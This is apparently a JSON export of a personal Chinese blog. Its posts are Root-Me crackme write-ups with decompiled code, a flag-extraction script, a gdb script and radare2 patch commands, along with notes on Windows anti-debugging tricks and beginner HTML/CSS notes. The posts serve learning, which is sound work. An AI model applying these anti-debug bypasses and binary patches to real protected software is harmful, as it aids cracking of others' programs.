{"meta":{"title":"FINSENTY54","subtitle":"几处早莺争暖树，谁家新燕啄春泥。","description":"blog","author":"finsenty54","url":"http://finsenty54.github.io","root":"/"},"pages":[{"title":"","date":"2019-11-18T11:42:09.534Z","updated":"2019-02-27T03:24:00.000Z","comments":true,"path":"googleda09d6ee39745173.html","permalink":"http://finsenty54.github.io/googleda09d6ee39745173.html","excerpt":"","text":"google-site-verification: googleda09d6ee39745173.html"},{"title":"about","date":"2019-04-26T07:15:52.000Z","updated":"2020-07-06T06:10:41.789Z","comments":true,"path":"about/index.html","permalink":"http://finsenty54.github.io/about/index.html","excerpt":"","text":"本科毕业喽，新研一.o(￣▽￣)ブ"},{"title":"categories","date":"2020-04-10T07:30:47.000Z","updated":"2020-04-10T07:33:07.916Z","comments":true,"path":"categories/index.html","permalink":"http://finsenty54.github.io/categories/index.html","excerpt":"","text":""},{"title":"rss","date":"2019-04-26T07:28:26.000Z","updated":"2019-04-26T07:48:06.000Z","comments":true,"path":"rss/index.html","permalink":"http://finsenty54.github.io/rss/index.html","excerpt":"","text":"我的rss:https://finsenty54.github.io/atom.xml ，欢迎订阅！"},{"title":"tags","date":"2020-04-10T07:29:52.000Z","updated":"2020-04-10T07:33:09.616Z","comments":true,"path":"tags/index.html","permalink":"http://finsenty54.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"ELF x64 - Nanomites - Introduction_WP","slug":"ELF x64 - Nanomites - Introduction_WP","date":"2020-10-31T02:39:38.000Z","updated":"2020-10-31T02:41:04.191Z","comments":true,"path":"2020/10/31/ELF x64 - Nanomites - Introduction_WP/","link":"","permalink":"http://finsenty54.github.io/2020/10/31/ELF x64 - Nanomites - Introduction_WP/","excerpt":"ELF x64 - Nanomites - Introduction_WP这是运用了Debug Blocker技术的题目又花了些时间，终于破解了 gdb 设置跟踪父进程还是子进程set follow-fork-mode parrent|child当发生fork时，指示调试器执行父进程还是子进程 ptrace在程序执行到int3时，就会触发 SIGTRAP信号，","text":"ELF x64 - Nanomites - Introduction_WP这是运用了Debug Blocker技术的题目又花了些时间，终于破解了 gdb 设置跟踪父进程还是子进程set follow-fork-mode parrent|child当发生fork时，指示调试器执行父进程还是子进程 ptrace在程序执行到int3时，就会触发 SIGTRAP信号， long ptrace(enum __ptrace_request request, pid_t pid, void addr, void data);参数data：作用则根据request的不同而变化，如果需要向目标进程中写入数据，data存放的是需要写入的数据；如果从目标进程中读数据，data将存放返回的数据 strace可以先用strace来观察在系统调用strace -i ./ch28.bin12345678910111213141516171819202122[00007fa5f9b6bf4e] read(0, toto /输入值\"toto\\n\", 1024) = 5[00007fa5f9b75c22] mmap(NULL, 321, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fa5f9c8e000[00007fa5f9b4857b] clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7fa5f9c43810) = 131358[00007fa5f9b48286] wait4(131358, [&#123;WIFSTOPPED(s) &amp;&amp; WSTOPSIG(s) == SIGTRAP&#125;], 0, NULL) = 131358[00007fa5f9b48286] --- SIGCHLD &#123;si_signo=SIGCHLD, si_code=CLD_TRAPPED, si_pid=131358, si_uid=1000, si_status=SIGTRAP, si_utime=0, si_stime=0&#125; ---[00007fa5f9b7329a] ptrace(PTRACE_GETREGS, 131358, NULL, 0x7fff0dde4900) = 0[00007fa5f9b7329a] ptrace(PTRACE_SETREGS, 131358, NULL, 0x7fff0dde4900) = 0[00007fa5f9b7329a] ptrace(PTRACE_CONT, 131358, NULL, 0) = 0[00007fa5f9b48286] wait4(131358, [&#123;WIFSTOPPED(s) &amp;&amp; WSTOPSIG(s) == SIGTRAP&#125;], 0, NULL) = 131358[00007fa5f9b48286] --- SIGCHLD &#123;si_signo=SIGCHLD, si_code=CLD_TRAPPED, si_pid=131358, si_uid=1000, si_status=SIGTRAP, si_utime=0, si_stime=0&#125; ---[00007fa5f9b7329a] ptrace(PTRACE_GETREGS, 131358, NULL, 0x7fff0dde4900) = 0[00007fa5f9b7329a] ptrace(PTRACE_SETREGS, 131358, NULL, 0x7fff0dde4900) = 0[00007fa5f9b7329a] ptrace(PTRACE_CONT, 131358, NULL, 0) = 0[00007fa5f9b48286] wait4(131358, [&#123;WIFEXITED(s) &amp;&amp; WEXITSTATUS(s) == 1&#125;], 0, NULL) = 131358[00007fa5f9b48286] --- SIGCHLD &#123;si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=131358, si_uid=1000, si_status=1, si_utime=0, si_stime=0&#125; ---[00007fa5f9b48286] wait4(131358, 0x7fff0dde4a1c, 0, NULL) = -1 ECHILD (No child processes)[00007fa5f9b6bff3] write(1, \"Wrong! try hard! :)\\n\", 20Wrong! try hard! :)) = 20[00007fa5f9b6c087] lseek(0, -1, SEEK_CUR) = -1 ESPIPE (Illegal seek)[00007fa5f9b48759] exit_group(0) = ?[????????????????] +++ exited with 0 +++ 当我输入值‘toto’，触发了两次 SIGTRAP，之后退出 反编译直接IDA PRO反编译其他的细节都不管，就看我们需要的1234567891011121314151617181920212223242526272829303132333435363738int __fastcall sub_400871(__int64 input)&#123; int result; // eax int stat_loc; // [rsp+1Ch] [rbp-F4h] void *v3; // [rsp+F8h] [rbp-18h] __pid_t pid; // [rsp+104h] [rbp-Ch] void *dest; // [rsp+108h] [rbp-8h] stat_loc = 0; dest = mmap(0LL, 0x141uLL, 7, 34, -1, 0LL); // 0x7ffff7ffb000 memcpy(dest, src, 0x8DuLL); // src == 0x601080 指向400ac0( 0x48 pid = fork(); if ( !pid ) // 子进程 &#123; if ( ptrace(0, 0LL, 0LL, 0LL) == -1 ) &#123; puts(\"So you want to trace me?!\"); exit(42); &#125; v3 = dest; ((void (__fastcall *)(__int64))dest)(input); exit(0); &#125; while ( waitpid(pid, &amp;stat_loc, 0) != -1 ) &#123; if ( (unsigned __int8)stat_loc == 127 ) &#123; if ( BYTE1(stat_loc) == 5 ) // 0x57f &gt;&gt;8 =0x5 sub_400736((__int64)dest, pid); ptrace(PTRACE_CONT, (unsigned int)pid, 0LL, 0LL); //表示继续执行子进程 &#125; &#125; if ( BYTE1(stat_loc) ) result = puts(\"Wrong! try hard! :)\"); else result = puts(\"POOOOOOOOOOOOOOOOOOOOOOOOO God damn!! You won!\"); return result;&#125; 子进程会执行 memcpy()h函数复制到dest的代码，src == 0x601080 指向400ac0，所以实际复制的是400ac0处的指令。 RDI保存着我们输入的数据，每次读取一个字节，存入al，之后int3,就会触发SIGTRAP，父进程进行调试子进程。 123456789101112131415161718192021222324252627282930313233343536373839__int64 __fastcall sub_400736(__int64 dest, unsigned int pid)&#123; __int64 result; // rax char v3; // [rsp+10h] [rbp-F0h] 0x7fffffffdc00 ==RAX 子进程寄存器值放在这里 __int64 v4; // [rsp+60h] [rbp-A0h] __int64 v5; // [rsp+90h] [rbp-70h] __int64 v6; // [rsp+A0h] [rbp-60h] 0x400a30 有问题 __int64 dest_1; // [rsp+F0h] [rbp-10h] int i; // [rsp+F8h] [rbp-8h] unsigned __int8 v9; // [rsp+FFh] [rbp-1h] // 0x20cf9 子进程pid v9 = 0; dest_1 = dest + 1; // dest + 1 result = ptrace(PTRACE_GETREGS, pid, 0LL, &amp;v3);// 获取值所有寄存器值？？ // for ( i = 0; i &lt;= 12; ++i ) // 13个int 3 &#123; // rbp-0x8 = i result = seg_6010A0[3 * i]; if ( v5 - dest_1 == result ) // v5 = 0x7ffff7ffb00c // c-1 = b ==11 &#123; result = (unsigned int)v9++ + 1; if ( v9 ) &#123; if ( seg_6010A0[3 * i + 1 + i % 2] == v4 )// v4 == input 表示输入值放在子进程r9中 0x7fffffffdc50 v6 |= 0x40uLL; // 修改了V6 0x7fffffffdc90 第十八个 表示EFLAGS // 之前 rax 处 程序 JE zf=0 才不跳转 如果跳转则程序结束 result = ptrace(PTRACE_SETREGS, pid, 0LL, &amp;v3);// 设置值 break; &#125; &#125; &#125; if ( !v9 ) &#123; puts(\"Hummmmmmm NO WAY.\"); exit(42); &#125; return result;&#125; ptrace(PTRACE_GETREGS, pid, 0LL, &amp;v3)获取所有子进程寄存器值，存放在V3地址处。 if ( seg_6010A0[3 * i + 1 + i % 2] == v4 )// v4 == input 表示输入值放在子进程r9中 0x7fffffffdc50这条语句就是我们需要的，其将我们的输入值与6010A0处的值进行比较，如果相等，则修改V6，也就是EFLAGS，将ZF置1，JNE不跳转，如果跳转了直接结束进程。 ptrace(PTRACE_SETREGS, pid, 0LL, &amp;v3)将修改后的寄存器值重新赋给子进程 从if知道，比较共进行13次，下面编写python脚本12345678910111213141516171819202122data=[]flag=[]print(\"give me a bottle of rum!\")with open('ch28.txt','rt') as f: for line in f.readlines(): if(line.find('db')!=-1): pos=line.find('db') item=line[pos+4:pos+6] data.append(int(item,16))for i in data: print(format(i,'x'))for i in range(13): flag.append(data[3*i+1+i%2])print('1111111111111111111111111111')for i in flag: print(chr(i),end='')print()print(len(flag)) ch28.txt保存6010A0开始的数据。 运行得到flag make -n 显示命令，但不执行 大佬代码12345678910111213141516171819202122232425262728import gdbimport repassword = \"start_with_anything\"gdb.execute('file ./ch28.bin')gdb.execute('set pagination off')gdb.execute('br *0x40080d')gdb.execute('run &lt;&lt;&lt; '+password)rdx = gdb.execute('info reg rdx',to_string=True)rdx = re.findall('^rdx\\s+\\w+\\s+(\\d+)$', rdx)password = \"\" + chr( int(rdx[0]) )while True: gdb.execute('run &lt;&lt;&lt; '+password) # Continue to last character for i in password: gdb.execute('c') try: rdx = gdb.execute('info reg rdx',to_string=True) except gdb.error: # If info reg fails it is probably because the program has exited. break rdx = re.findall('^rdx\\s+\\w+\\s+(\\d+)$', rdx) password += chr( int(rdx[0]) )print(\"Password found is :\"+password)gdb.execute('quit') 论文 想法云攻击 让VM支持去重，然后flush+reload 建立cpu cache的随机策略映射","categories":[],"tags":[{"name":"RCE","slug":"RCE","permalink":"http://finsenty54.github.io/tags/RCE/"}]},{"title":"前端学习_html_css_1","slug":"前端学习_html_css_1","date":"2020-10-29T13:10:00.000Z","updated":"2020-10-29T13:10:56.944Z","comments":true,"path":"2020/10/29/前端学习_html_css_1/","link":"","permalink":"http://finsenty54.github.io/2020/10/29/前端学习_html_css_1/","excerpt":"前端学习html小知识连接 80 端口需要管理员权限（非管理员用户只能监听大于 1024 的端口 流（stream）代表一个客户端和服务端之间打开的连接。 ？闭包作为参数？","text":"前端学习html小知识连接 80 端口需要管理员权限（非管理员用户只能监听大于 1024 的端口 流（stream）代表一个客户端和服务端之间打开的连接。 ？闭包作为参数？ &lt;!DOCTYPE html&gt;— 文档类型。混沌初分，HTML 尚在襁褓（大约是 1991/92 年）之时，DOCTYPE 用来链接一些 HTML 编写守则，比如自动查错之类。DOCTYPE 在当今作用有限，仅用于保证文档正常读取。现在知道这些就足够了。 html&lt;html&gt; 元素。该元素包含整个页面的内容，也称作根元素。 head&lt;head&gt;元素。该元素的内容对用户不可见，其中包含例如面向搜索引擎的搜索关键字（keywords）、页面描述、CSS 样式表和字符编码声明等。 &lt;meta charset=&quot;utf-8&quot;&gt;该元素指定文档使用 UTF-8 字符编码 ，UTF-8 包括绝大多数人类已知语言的字符。基本上 UTF-8 可以处理任何文本内容，还可以避免以后出现某些问题，没有理由再选用其他编码。 &lt;title&gt;元素。该元素设置页面的标题，显示在浏览器标签页上，也作为收藏网页的描述文字。 body&lt;body&gt;元素。该元素包含期望让用户在访问页面时看到的内容，包括文本、图像、视频、游戏、可播放的音轨或其他内容。 img&lt;img src=&quot;images/firefox-icon.png&quot; alt=&quot;测试图片&quot;&gt; alt，是图像的描述内容 属性src也是属性，资源 列表listul无序ol有序列表的每个项目用一个列表项目（List Item）元素 &lt;li&gt; 包围 &lt;ul&gt; 无序列表 &lt;li&gt;技术人员&lt;/li&gt; &lt;li&gt;思考者&lt;/li&gt; &lt;li&gt;建造者&lt;/li&gt; &lt;/ul&gt; ####a链接非常重要 — 它们赋予 Web 网络属性。要植入一个链接，我们需要使用一个简单的元素 — &lt;a&gt; — a 是 “anchor” （锚）的缩写 &lt;a href=&quot;https://www.mozilla.org/zh-CN/about/manifesto/&quot;&gt;Mozilla 宣言&lt;/a&gt; href是属性 测试本地文件它们具有服务端代码。 服务器端语言（如 PHP 或 Python）需要一个特殊的服务器来解释代码并提供结果。 层叠样式表（Cascading Style Sheet，简称：CSS）是为网页添加样式的代码要选择一个 HTML 页面里所有的段落元素，然后将其中的文本改成红色，可以这样写 CSSp { color: red;}再将该 CSS 文件连接至 HTML 文档，否则 CSS 代码不会对 HTML 文档在浏览器里的显示效果有任何影响 JavaScript（缩写：JS）是一门完备的 动态编程语言 对象：JavaScript 里一切皆对象，一切皆可储存在变量里。 例如disabled 属性，他们可以标记表单输入使之变为不可用(变灰色)， 实体引用： 在HTML中包含特殊字符 &lt; &amp;lt; &gt; &amp;gt; &quot; &amp;quot; &apos; &amp;apos; &amp; &amp;amp; 注释HTML中的内容置为注释，你需要将其用特殊的记号&lt;!--和--&gt;包括起来 meta许多&lt;meta&gt;元素包含了name 和 content 特性： name 指定了meta 元素的类型； 说明该元素包含了什么类型的信息。content 指定了实际的元数据内容。 span在你的站点增加自定义图标这是一个 &lt;span&gt;元素，它没有语义。当您想要对它用CSS（或者JS）时，您可以用它包裹内容，且不需要附加任何额外的意义 文字样式无序&lt;ul&gt;有序 Ordered&lt;ol&gt; 元素将一个列表嵌入到另一个列表是完全可以的用&lt;em&gt;（emphasis）元素来标记斜体&lt;strong&gt;加粗&lt;i&gt;被用来传达传统上用斜体表达的意义：外国文字，分类名称，技术术语，一种思想……&lt;b&gt; 被用来传达传统上用粗体表达的意义：关键字，产品名称，引导句……&lt;u&gt; 被用来传达传统上用下划线表达的意义：专有名词，拼写错误……不要用 超链接&lt;a href=&quot;https://www.mozilla.org/zh-CN/&quot;&gt;Mozilla 主页&lt;/a&gt; alt属性添加支持信息 &lt;a href=&quot;https://www.mozilla.org/zh-CN/&quot;&gt; &lt;img src=&quot;mozilla-image.png&quot; alt=&quot;链接至 Mozilla 主页的 Mozilla 标志&quot;&gt; &lt;/a&gt; 可以有两个index.html文件，前提是他们在不同的目录下 指向上级目录： 如果你想在projects/index.html中包含一个指向pdfs/project-brief.pdf的超链接，你必须先返回上级目录，然后再回到pdf目录。“返回上一个目录级”使用两个英文点号表示 — .. — 所以你应该使用的URL是../pdfs/project-brief.pdf 超链接除了可以链接到文档外，也可以链接到HTML文档的特定部分（被称为文档片段）。必须首先给要链接到的元素分配一个id属性 &lt;a href=&quot;contacts.html#Mailing_address&quot;&gt;我们的地址&lt;/a&gt; &lt;a href=&quot;#Mailing_address&quot;&gt; 当链接到同一网站的其他位置时，你应该使用相对链接（当链接到另一个网站时，你需要使用绝对链接使用绝对URL时，浏览器首先通过DNS（见万维网是如何工作的）查找服务器的真实位置 12&lt;a href=\"https://download.mozilla.org/?product=firefox-latest-ssl&amp;os=win64&amp;lang=zh-CN\" download=\"firefox-latest-64bit-installer.exe\"&gt; 默认保存文件名 网站结构创建网站的一种常见方式——每一页都使用相同的页面结构，包括相同的导航菜单 &lt;a href=&quot;mailto:nowhere@mozilla.org&quot;&gt;向 nowhere 发邮件&lt;/a&gt; 使用上标和下标。 &lt;sup&gt; 和&lt;sub&gt;元素可 &lt;p&gt;如果 x&lt;sup&gt;2&lt;/sup&gt; 的值为 9，那么 x 的值必为 3 或 -3。&lt;/p&gt; 为了实现语义化标记，HTML 提供了明确这些区段的专用标签，例如： 12345&lt;header&gt;：页眉。&lt;nav&gt;：导航栏。&lt;main&gt;：主内容。主内容中还可以有各种子内容区段，可用&lt;article&gt;、&lt;section&gt; 和 &lt;div&gt; 等元素表示。&lt;aside&gt;：侧边栏，经常嵌套在 &lt;main&gt; 中。&lt;footer&gt;：页脚。 12345&lt;span&gt; 是一个内联的（inline）无语义元素，使用 class 属性提供一些标签，使这些元素能易于查询&lt;div&gt; 是一个块级无语义元素，应仅用于找不到更好的块级元素时，或者不想增加特定的意义时&lt;br&gt; 可在段落中进行换行&lt;hr&gt; 元素在文档中生成一条水平分割线 &lt;iframe&gt;元素旨在允许您将其他Web文档嵌入到当前文档中 CSS给 HTML 元素加个类名（class），在 CSS 中再选中那个类名123456&lt;li class=\"special\"&gt;css中.special &#123; color: orange; font-weight: bold;&#125; 选择器重要：：选择嵌套在&lt;li&gt; 元素内的&lt;em&gt;我们可以使用一个称为包含选择符的选择器，它只是单纯地在两个选择器之间加上一个空格 123li em &#123; color: rebeccapurple;&#125; 设置直接出现在标题后面并且与标题具有相同层级的段落样式，为此需在两个选择器之间添加一个 + 号 (成为 相邻选择符) 根据状态确定样式 a:link a:hover article p span { ... } h1 + ul + p { ... } 12body h1 + p .special &#123;在&lt;body&gt;之内，紧接在&lt;h1&gt;后面的&lt;p&gt;元素的内部，类名为special。 css属性12345font-sizewidthbackground-colorcolorborder calc()函数 进行简单计算rotate() 额外样式表将额外的样式表导入主CSS样式表，可以使用@import:@import &#39;styles2.css&#39;; 规则应用两条同级别的规则（相同规则）理解为后面的规则覆盖前面的规则 有不同选择器对应相同的元素的时候需要使用哪个规则一个元素选择器比类选择器的优先级更低会被其覆盖 1234千位： 如果声明在 style 的属性（内联样式）则该位得一分。这样的声明没有选择器，所以它得分总是1000。百位： 选择器中包含ID选择器则该位得一分。十位： 选择器中包含类选择器、属性选择器或者伪类则该位得一分。个位：选择器中包含元素、伪元素选择器则该位得一分。 class id1234&lt;div id=\"outer\" class=\"container\"&gt;#outer a &#123; background-color: red;&#125; id 对应#outerclass对应.container 盒子12345标题(&lt;h1&gt;等)和段落(&lt;p&gt;)默认情况下都是块级的盒子做链接的 &lt;a&gt; 元素、 &lt;span&gt;、 &lt;em&gt; 以及 &lt;strong&gt; 都是默认处于 inline 状态的＜div＞块级元素盒子display 属性的设置，比如 inline 或者 block ，来控制盒子的外部显示类型在标准模型中，如果你给盒设置 width 和 height，实际设置的是 content box 替代盒模型，width就是盒的宽度，而不是content的宽度123456html &#123; box-sizing: border-box;&#125;*, *::before, *::after &#123; box-sizing: inherit;&#125; 有两个外边距相接的元素，这些外边距将合并为一个外边距，即最大的单个外边距的大小 inline-block元素使用 display: inline-block，实现我们需要的块级的部分效果： 设置width 和height 属性会生效。padding, margin, 以及border 会推开其他元素。 背景图像默认情况下，大图不会缩小以适应方框，因此我们只能看到它的一个小角，而小图则是平铺以填充方框 background-repeat属性用于控制图像的平铺行为 background-size属性，它可以设置长度或百分比值，来调整图像的大小以适应背景 背景是指定他们如何滚动时，内容滚动。这是由background-attachment属性控制的 border-radius属性和与方框的每个角相关的长边来实现方框的圆角 background-color:rgba(0,0,0,.5);RGBA颜色 第四个值表示颜色的alpha通道，它控制不透明度。如果将这个值设置为0，它将使颜色完全透明半透明的黑色背景颜色 溢出12345overflow属性overflow: hidden 隐藏掉溢出overflow: scroll 你的浏览器总会显示滚动条overflow-x －ｙoverflow: auto 绝对长度单位px 像素 ＝1/96ｃｍ 相对长度单位em 在 font-size 中使用是相对于父元素的字体大小，在其他属性中使用是相对于自身的字体大小，如 width 总是想让它至少有个确定的高度，你应该给它设置一个min-height属性 图片溢出一张图片的max-width设为100%。max－width:100%指的是父容器宽度的百分数技术是用来让图片可响应的，所以在更小的设备上浏览的时候，它们会合适地缩放，但会先加载大的图像，在缩放 主页cargo-generate","categories":[],"tags":[{"name":"FRONT-END","slug":"FRONT-END","permalink":"http://finsenty54.github.io/tags/FRONT-END/"}]},{"title":"nice try","slug":"nice_try","date":"2020-10-27T07:34:42.000Z","updated":"2020-10-27T07:35:25.612Z","comments":true,"path":"2020/10/27/nice_try/","link":"","permalink":"http://finsenty54.github.io/2020/10/27/nice_try/","excerpt":"&lt;逆向工程-核心原理&gt;终结看了两三年，终于看完了，nice try2020-10-27 15:20:20 星期二 :tw-1f4aa: 接下来的是阅读过程中的一些笔记","text":"&lt;逆向工程-核心原理&gt;终结看了两三年，终于看完了，nice try2020-10-27 15:20:20 星期二 :tw-1f4aa: 接下来的是阅读过程中的一些笔记 内核调试终端中输入 bcdedit -debug on开启内核调试模式 WINDBGlkd&gt; u nt!ZwCreateFile L50 查看createfile 代码u 反汇编 u L10显示10行命令 db命令d-display 删除ASLR功能将选择头中的DLL Characteristics中DYNAMIC_BASE标志删除即可 TLS回调函数长用于反调试类似于linux ptrace()函数 每当创建/终止进程的线程时会自动调用执行的函数。创建进程的主线程会先于EP代码，调用回调函数 在选择头中有TLS表地址，里面是tls结构体的地址，可能有多个结构体，address of callbacks成员指向tls函数地址 isDebuggerPersent()检查peb.deingdebugged值，+02处判断是否处于调试 getmodulehandle()获取进程imagebase windbg 配置符号表srv*https://msdl.microsoft.com/download/symbols通知 WinDbg 进行符号文件的初始查找和加载：.reloadLm 查看已加载模块 dtdisplays information about a local variable, global variable or data type dt _tebdt _pebdt _peb_ldr_data PEB模块=dll加载后，通过PEB.ldr 直接获取该模块的加载基地址 FS:[0] TEB起始地址 FS:[30] PEB起始地址 利用SEH机制的反调试技术程序在正常运行和调试运行时表现出的行为动作是不同的正常：程序自己处理调试时：抛给调试器处理 通过TEB.NtTib.ExceptionList找到SEH链 TEB.NtTib.ExceptionList =FS：[0] 结构体 构成链 * next_seh * handler esp+c 即指向 pContextseh函数参数第三个为指向pContext的指针，保存线程寄存器值，执行其他进程就会保存寄存器值。*pContext+B8(32位下）为EIP值， 修改EIP，改变执行流程一样，通过PEB.isdebuggerpersent()API 取得beingDebugged值判断 保护器，压缩器 反调试–一个更简单，更好的方法：判断当前系统是否是为逆向分析专用系统 findWindow() , createTOOLhelp32SnapsHOT() , GETcomputerName() OllyDBG view-seh chainPEB.ImageBase 保存进程的实际映射地址 debug blocker 被调试进程不能被其他进程调试 调试器操作被调试者的代码 调试器处理被调试进程中发生的异常 clbpollydgb的条件记录断点ctrl+G 将光标移到4011f0地址后，按shift+f4，打开设置CLBP对话框（条件断点） detach 分离 EB FE 无限循环 DebugActiveProcessStop()将被调试者从调试器中分离出来","categories":[],"tags":[{"name":"RCE","slug":"RCE","permalink":"http://finsenty54.github.io/tags/RCE/"}]},{"title":"ELF_x64_Nanomites_Introduction","slug":"ELF_x64_Nanomites_Introduction","date":"2020-10-26T02:08:58.000Z","updated":"2020-10-26T02:12:52.564Z","comments":true,"path":"2020/10/26/ELF_x64_Nanomites_Introduction/","link":"","permalink":"http://finsenty54.github.io/2020/10/26/ELF_x64_Nanomites_Introduction/","excerpt":"ELF x64 - Nanomites - Introductionmmapmmap只是在虚拟内存分配了地址空间，只有在第一次访问虚拟内存的时候才分配物理内存。 void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);","text":"ELF x64 - Nanomites - Introductionmmapmmap只是在虚拟内存分配了地址空间，只有在第一次访问虚拟内存的时候才分配物理内存。 void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset); 在虚拟地址空间中为所调用进程创建一个新的映射。开始地址为addr，长度为length内核在靠近页边界的地方，尝试创建。如果已有映射在此，就不用addr，会返回新地址 The contents of a file mapping(as opposed to an anonymous mapping; see MAP_ANONYMOUS below), are initialized using length bytes starting at offsetoffset in the file (or other object) referred to by the file descriptor fd. prot参数描述所需的内存保护 The flags argument determines whether updates to the mapping are visible to other processes mapping the same region, and whether updates are carried through to the underlying file. mmap 在虚拟空间中开辟一段空间，当要读的时候，将文件内容加载进物理内存 memcpyvoid * memcpy ( void * destination, const void * source, size_t num ); 表示将0x400ac0的141个字节拷贝到新开辟的虚拟空间中0x7ffff7ffb000 0x4008b6: mov rcx,QWORD PTR [rip+0x2007c3] # 0x601080rcx==0x3148c93148c03148 r2help x命令：x/3uh 0x54320 表示，从内存地址0x54320读取内容，h表示以双字节为一个单位，3表示输出三个单位，u表示按十六进制显示。 gdb-peda$ x/141xb 0x400ac0 forkpid_t fork(void)fork系统调用用于创建一个新进程，称为子进程，它与进程（称为系统调用fork的进程）同时运行，此进程称为父进程。创建新的子进程后，两个进程将执行fork（）系统调用之后的下一条指令。 返回值： 若成功调用一次则返回两个值，子进程返回0，父进程返回子进程ID；否则，出错返回-1 这意味着父子进程间不共享这些存储空间。 0x4008d1: call 0x400630 &lt;fork@plt&gt; 调用后返回0， 则当前的子进程 gdb catch 捕获异常 waitpid作用同于wait，但可指定pid进程清理，可以不阻塞。 pid_t waitpid(pid_t pid,int *status,int options);成功：返回清理掉的子进程ID；失败：-1（无子进程） pid&gt;0 只等待进程ID等于pid的子进程，不管其它已经有多少子进程运行结束退出了，只要指定的子进程还没有结束，waitpid就会一直等下去。 参数status如果不是一个空指针,则终止进程的终止状态就存放在status所指向的单元。 SARSAR 算术右移指令符号位保持不变 call rax 如果都不跳转，则到这里0x7ffff7ffb07b: mov al,0x3c 0x7ffff7ffb07d: mov edi,0x0 0x7ffff7ffb082: syscall 没有解出来:tw-1f198::worried:","categories":[],"tags":[{"name":"RCE","slug":"RCE","permalink":"http://finsenty54.github.io/tags/RCE/"}]},{"title":"ELF x86 - Anti-debug","slug":"ELF x86 - Anti-debug","date":"2020-10-23T13:38:58.000Z","updated":"2020-10-23T13:39:43.618Z","comments":true,"path":"2020/10/23/ELF x86 - Anti-debug/","link":"","permalink":"http://finsenty54.github.io/2020/10/23/ELF x86 - Anti-debug/","excerpt":"ELF x86 - Anti-debug参考https://re.kv.io/crackme/12.htmlint 80 系统调用32位下，EAX保存调用号mov eax , 30 utime, utimes - change file last access and modification timesint utime(const char filename, const struct utimbuf times); The utime() system call changes the access and modification times ofthe inode specified by filename to the actime and modtime fields oftimes respectively.","text":"ELF x86 - Anti-debug参考https://re.kv.io/crackme/12.htmlint 80 系统调用32位下，EAX保存调用号mov eax , 30 utime, utimes - change file last access and modification timesint utime(const char filename, const struct utimbuf times); The utime() system call changes the access and modification times ofthe inode specified by filename to the actime and modtime fields oftimes respectively. 上面是错的0x30 as sys_signal 十六进制 直接弄错0x30 == 48 void (*signal(int sig, void (*func)(int)))(int) sys_signal设置一个函数来处理信号，即带有 sig 参数的信号处理程序sig– 在信号处理程序中作为变量使用的信号码0x5 ==SIGABRT (Signal Abort) 程序异常终止。func – 一个指向函数的指针。它可以是一个由程序定义的函数 int3 would cause a debugger to stop12345678910111213.text:08048063 loc_8048063: ; CODE XREF: start↑j.text:08048063 mov eax, 30h.text:08048068 mov ebx, 5.text:0804806D mov ecx, offset sub_80480E2.text:08048072 int 80h ; LINUX - sys_signal.text:08048074 jmp short loc_8048077.text:08048074 ; ---------------------------------------------------------------------------.text:08048076 db 0CEh.text:08048077 ; ---------------------------------------------------------------------------.text:08048077.text:08048077 loc_8048077: ; CODE XREF: start+14↑j.text:08048077 int 3 ; Trap to Debugger.text:08048078 jmp short loc_804807B 先设置第一个signal处理函数，在0x08048077处遇到int 3跳到处理函数 12345678910111213141516171819202122232425262728293031323334.text:080480E2.text:080480E2 sub_80480E2 proc near ; DATA XREF: start+D↑o.text:080480E2 mov eax, offset sub_8048104.text:080480E7 jmp short loc_8048101.text:080480E9 ; ---------------------------------------------------------------------------.text:080480E9.text:080480E9 loc_80480E9: ; CODE XREF: sub_80480E2:loc_80480FF↓j.text:080480E9 ; sub_80480E2:loc_8048101↓j.text:080480E9 cmp eax, 80482E8h.text:080480EE jz short locret_8048103.text:080480F0 jmp short loc_80480F3.text:080480F0 ; ---------------------------------------------------------------------------.text:080480F2 db 0E8h.text:080480F3 ; ---------------------------------------------------------------------------.text:080480F3.text:080480F3 loc_80480F3: ; CODE XREF: sub_80480E2+E↑j.text:080480F3 xor dword ptr [eax], 8048FC1h.text:080480F9 add eax, 4.text:080480FC jmp short loc_80480FF.text:080480FC ; ---------------------------------------------------------------------------.text:080480FE db 0EBh.text:080480FF ; ---------------------------------------------------------------------------.text:080480FF.text:080480FF loc_80480FF: ; CODE XREF: sub_80480E2+1A↑j.text:080480FF jmp short loc_80480E9.text:08048101 ; ---------------------------------------------------------------------------.text:08048101.text:08048101 loc_8048101: ; CODE XREF: sub_80480E2+5↑j.text:08048101 jmp short loc_80480E9.text:08048103 ; ---------------------------------------------------------------------------.text:08048103.text:08048103 locret_8048103: ; CODE XREF: sub_80480E2+C↑j.text:08048103 retn.text:08048103 sub_80480E2 endp 将代码解密出来，然后后面根据signal执行处理代码 1' '.join(map(lambda i: chr(i ^ 0xfc), [0xA5, 0xCF, 0x9D, 0xB4, 0xDD, 0x88, 0xB4, 0x95, 0xAF, 0x95, 0xAF, 0x88, 0xB4, 0xCF, 0x97, 0xB9, 0x85, 0xDD])) &#39; &#39;字符串内置函数join()map(fun, iter)函数fun操作iter第一个参数 function 以参数序列中的每一个元素调用 function 函数，返回包含每次 function 函数返回值的新列表。lambda 声明为匿名函数，如：1map(lambda x: x ** 2, [1, 2, 3, 4, 5]) r2（一个大佬的解法）oo+ reopen in read-writewox 0xfc @ entry0+625!18 //会写入 将0xfc与后面18个值异或wox [val] ^= xor (f.ex: wox 0x90)ps @ entry0+625ps print string wa nop write nopcode using asm.arch and asm.bits12[0x0804060]&gt; wa nop @ 0x08048077[0x0804060]&gt; wa mov ecx, 0x80482d1 @ 0x08048167 控制程序流程 sys_write −12345mov edx,4 ; message lengthmov ecx,msg ; message to writemov ebx,1 ; file descriptor (stdout)mov eax,4 ; system call number (sys_write)int 0x80 ; call kernel","categories":[],"tags":[{"name":"RCE","slug":"RCE","permalink":"http://finsenty54.github.io/tags/RCE/"}]},{"title":"逆向_root_me_4","slug":"逆向_root_me_4","date":"2020-10-19T02:09:51.000Z","updated":"2020-10-19T02:10:41.090Z","comments":true,"path":"2020/10/19/逆向_root_me_4/","link":"","permalink":"http://finsenty54.github.io/2020/10/19/逆向_root_me_4/","excerpt":"ELF — Random Crackme将magic之前的内容都删除，因为之前的垃圾内容，使得不能运行ELF文件ELF 